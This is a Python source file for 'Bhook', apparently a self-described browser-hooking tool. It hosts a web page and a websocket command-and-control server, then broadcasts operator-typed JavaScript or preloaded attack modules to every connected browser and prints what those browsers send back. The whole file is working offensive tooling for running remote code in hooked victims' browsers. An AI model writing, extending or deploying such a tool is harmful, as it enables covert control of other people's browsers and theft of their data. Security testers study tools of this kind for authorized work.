import asyncio
from websockets.asyncio.server import serve
from scripts import scripts
from pathlib import Path
import threading
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from functools import partial
import time
import os
from prompt_toolkit import PromptSession
from prompt_toolkit import print_formatted_text
import argparse
import websockets

session = PromptSession()

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def handle(self):
        try:            
            super().handle()        
        except (ConnectionResetError, BrokenPipeError):
            pass

def start_web_server(ip,port):
    handler = partial(QuietHandler, directory="page")
    server = ThreadingHTTPServer((ip, port), handler)
    print(f"\nHosting website at: {ip}:{port}.")
    server.serve_forever()

CLIENTS = set()

async def conncted():
    last_count = len(CLIENTS)
    while True:
        current_count = len(CLIENTS)
        if current_count != last_count:
            print_formatted_text(f"CLIENTS: {len(CLIENTS)}")
            last_count = current_count
        await asyncio.sleep(0.1)

async def broadcast(timeout):
    asyncio.create_task(conncted())
    while True:
        for client in CLIENTS:
            try:
                m = await asyncio.wait_for(client.recv(), timeout=int(timeout))
                print("Received:", m)
            except websockets.exceptions.ConnectionClosed:
                pass
            except asyncio.TimeoutError:
                m = None

        cmd = await session.prompt_async("javascript > ")
        if cmd == "help":
            print("\nhelp, loads this page.")
            print("Typing in \"javscript>\" runs the input as javascript, unless the input is a recognized command.")
            print("Load, [module], run selected script in browser.")
            print("modules, list all mudules avaiable.")
            print("clear, clears screen")
            print("quit/exit, exits program.\n")
            print("!!! using anything that requires user input will make the program freeze unless added as script  EX: alert()!!!\n")

        if cmd == "clear":
            os.system("clear")
            
        if cmd == "modules":
            print("\n")
            script_names = list(scripts)
            columns = 4
            width = max(map(len, script_names)) + 4
            print("Moubles:")
            for i in range(0, len(script_names), columns):
                row = script_names[i:i + columns]    
                print("".join(script.ljust(width) for script in row))
            print("\n")
            cmd = ""

        if cmd.startswith("load "):
            module = cmd[5:]
            if module != '':
                if module not in scripts:
                    print(f"Module {module} doesn't exist")
                    message = ""
                else:
                    message = f"{scripts[module]()}"
            else:
                print("No mudule supplied.")
                message = ""
        else:
            message = cmd
        if message in {"quit", "exit"}:
            break
        if message == '':
            message = "" 
        await asyncio.gather(
            *(client.send(message) for client in CLIENTS),
            return_exceptions=True,
        )

async def handler(websocket):
    CLIENTS.add(websocket)
    
    try:
        await websocket.wait_closed()
    finally:
        CLIENTS.remove(websocket)

async def main(ip, port, timeout):
    print(f"Hosting server at: {ip}:{port}.\n")
    print("Browser can have false positives and false netgatives.")
    print("Type \"help\" to load help menu \n")

    async with serve(handler, ip, port):
        await broadcast(timeout)
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
            prog='Bhook',
            description='Bhook is a customizable and update to date browser hoook.',
            epilog='Make sure all arguments are inputted correctly!!!')

    parser.add_argument('-s','--server_ip', default="127.0.0.1", help="Server IP to host at.")
    parser.add_argument('-sp','--server_port', type=int, default=9000, help="Server port.")
    parser.add_argument('-ws','--web_ip', default="127.0.0.1", help="website IP to host at.")
    parser.add_argument('-wp','--web_port', type=int, default=8000, help="Website port.")
    parser.add_argument('-cb', '--callback', default="ws://127.0.0.1:9000", help="Browser hook call back adress. EX: ws://<Server IP>:<Server port>")
    parser.add_argument('-t', '--timeout', type=int, default=2, help="Time to wait for request form browsers.")
    args = parser.parse_args()

    ip = args.server_ip
    port = args.server_port
    web_ip = args.web_ip
    web_port = args.web_port
    cal_bck_addr = args.callback
    timeout = args.timeout

    if (cal_bck_addr[0:3] == "ws:"):
        pass
    else:
        if (cal_bck_addr[0:4] != "wss:"):
            print(f"{cal_bck_addr} is not a valid websocket url, please use ws:// or wss://")

    if Path("page/websocket_config.json").exists():
        with open("page/websocket_config.json", "w") as sock_addr:
            sock_addr_config = f"{{\"websocket_url\":\"{cal_bck_addr}\"}}\n"
            sock_addr.write(sock_addr_config)
            sock_addr.close()
    else:
        print("file page/websocket_config.json not found")
        exit()

    threading.Thread(target=start_web_server, args=(web_ip,int(web_port)),daemon=True).start()
    time.sleep(3)
    asyncio.run(main(ip,int(port),timeout))
